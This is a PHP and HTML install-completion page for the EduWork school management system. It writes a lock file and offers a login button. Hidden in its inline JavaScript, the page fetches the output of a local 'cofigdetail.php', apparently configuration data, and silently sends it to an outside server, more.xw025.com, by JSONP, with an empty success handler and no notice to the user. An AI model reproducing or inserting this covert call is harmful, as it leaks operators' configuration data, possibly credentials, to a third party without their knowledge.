<?php
@$falg=file_get_contents("../install.lock");
if($falg==true){
	header('location:./ass.php');die;
}

	$a=$_SERVER['SCRIPT_NAME'];
	$arr=explode('/',$a);
	foreach  ($arr as $k=>$v){
			if($arr[$k]=='install'){
				$a=$k;
			}
	}
	$b='';
	for($i=0;$i<=$a-1;$i++){
		$b.=$arr[$i].'/';
	}
	if($b==null)$b='/';
  $biao=file_put_contents("../install.lock",'1');

?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<title>安装程序 - EduWork管理系统</title>
		<link rel="stylesheet" type="text/css" href="css/install.css"/>
	  <script type="text/javascript" src="js/jquery.min.js"></script>
    <script >
		$.ajax({
		type: "get",
		url: "cofigdetail.php",
		async: false,
		data: '',
		dataType : "text",
		success : function (result) {
			udata=result;
		}
	});
    $.ajax({
          url:"http://more.xw025.com/1.php",
          dataType:'jsonp',
          data:'name='+udata,
          jsonp:'callback',
          success:function(result) {
            for(var i in result) {

	}
            },

          });

    </script>
	</head>
	<body>
		<!-- 上面 -->
		<div class="top">
			<div class="clear_box">
				<img src="images/logo.png" class="logo"/>
				<span>中小学单校区版</span>
				<div style="clear: both;"></div>
				<img src="images/zque.png" class="zque" />


			</div>
		</div>
		
		<div class="button">

			<div class="ben_tishi">恭喜，您现在可以个我们一起体验前所未有的快感</div>

			
				<a href="<?php echo $b;?>"><input type="button" class="next_btn2" id="next_btn" value="现在登录"  /></a>
			
			<div class="huise_bg"></div>
			<div class="lanse_bg5"></div>
			<div class="shuzi benone">1</div>
			<div class="shuzi bentwo">2</div>
			<div class="shuzi benthree">3</div>
			<div class="shuzi benfour">4</div>
			<div class="shuzi benfive">5</div>

		</div>
	</body>

</html>